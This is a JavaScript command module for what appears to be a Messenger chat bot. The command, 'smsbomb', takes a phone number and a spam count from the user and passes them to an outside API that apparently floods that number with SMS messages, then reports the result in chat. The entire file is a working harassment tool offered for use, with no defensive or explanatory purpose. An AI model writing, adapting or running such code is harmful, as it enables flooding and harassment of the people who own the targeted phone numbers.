const axios = require('axios');

module.exports = {
  name: 'smsbomb',
  description: 'smsbomb <phoneNumber> <spamCount>.',
  author: 'developer',
  async execute(senderId, args, pageAccessToken, sendMessage) {
    const phoneNumber = args[0];
    const spamCount = args[1];

    if (!phoneNumber || !spamCount || isNaN(spamCount)) {
      return sendMessage(senderId, { 
        text: '❌ 𝗨𝘀𝗮𝗴𝗲: 𝘀𝗺𝘀𝗯𝗼𝗺𝗯 𝗽𝗵𝗼𝗻𝗲𝗻𝘂𝗺 𝘀𝗽𝗮𝗺𝗰𝗼𝘂𝗻𝘁' 
      }, pageAccessToken);
    }

    sendMessage(senderId, { 
      text: '⏳ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗿𝗲𝗾𝘂𝗲𝘀𝘁 𝘁𝗼 𝗦𝗠𝗦 𝗯𝗼𝗺𝗯, 𝗽𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁...' 
    }, pageAccessToken);

    try {
      const response = await axios.get('https://ccprojectapis.ddns.net/api/smsbomb', {
        params: {
          phonenum: phoneNumber,
          spamnum: spamCount
        }
      });

      const { success, message } = response.data;

      if (success) {
        sendMessage(senderId, { 
          text: `✅ 𝗦𝗠𝗦 𝗯𝗼𝗺𝗯 𝗿𝗲𝗾𝘂𝗲𝘀𝘁 𝗶𝘀 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹!\n\n📞 𝗣𝗵𝗼𝗻𝗲: ${phoneNumber}\n💥 𝗦𝗽𝗮𝗺 𝗖𝗼𝘂𝗻𝘁: ${spamCount}\n\n📩 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: ${message}`
        }, pageAccessToken);
      } else {
        sendMessage(senderId, { 
          text: `❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗽𝗿𝗼𝗰𝗲𝘀𝘀 𝘆𝗼𝘂𝗿 𝗿𝗲𝗾𝘂𝗲𝘀𝘁.\n\n📩 𝗘𝗿𝗿𝗼𝗿: ${message}` 
        }, pageAccessToken);
      }

    } catch (error) {
      console.error('Error:', error);
      sendMessage(senderId, { 
        text: '❌ 𝗘𝗿𝗿𝗼𝗿 𝗶𝗻 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗦𝗠𝗦 𝗯𝗼𝗺𝗯 𝗿𝗲𝗾𝘂𝗲𝘀𝘁.' 
      }, pageAccessToken);
    }
  }
};
